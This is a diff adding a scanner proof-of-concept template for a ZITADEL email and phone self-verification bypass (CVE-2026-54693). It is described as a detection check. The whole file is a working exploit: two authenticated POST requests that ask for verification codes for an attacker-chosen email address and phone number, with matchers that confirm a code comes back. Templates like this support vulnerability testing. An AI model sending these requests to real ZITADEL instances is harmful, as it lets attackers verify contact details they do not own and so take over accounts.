@@ -1,0 +1,60 @@
+[info]
+author = "ave"
+description = "检测 ZITADEL 实例中邮箱/电话验证码接口是否存在权限绕过漏洞。已认证用户可请求非本人邮箱或电话的验证码，绕过所有权验证。"
+id = "POC-AVE-2026-0787"
+name = "ZITADEL 邮箱与电话自验证权限绕过漏洞 PoC"
+severity = "high"
+tags = ["ave-2026-0787"]
+vuln_id = [
+    "CVE-2026-54693",
+    "AVE-2026-0787",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/v2/users/me/email/verify"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"email":"attacker-controlled@example.com"}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "code",
+    "verificationCode",
+    "verification_code",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/v2/users/me/phone/verify"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"phone":"+8612345678901"}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "code",
+    "verificationCode",
+    "verification_code",
+]
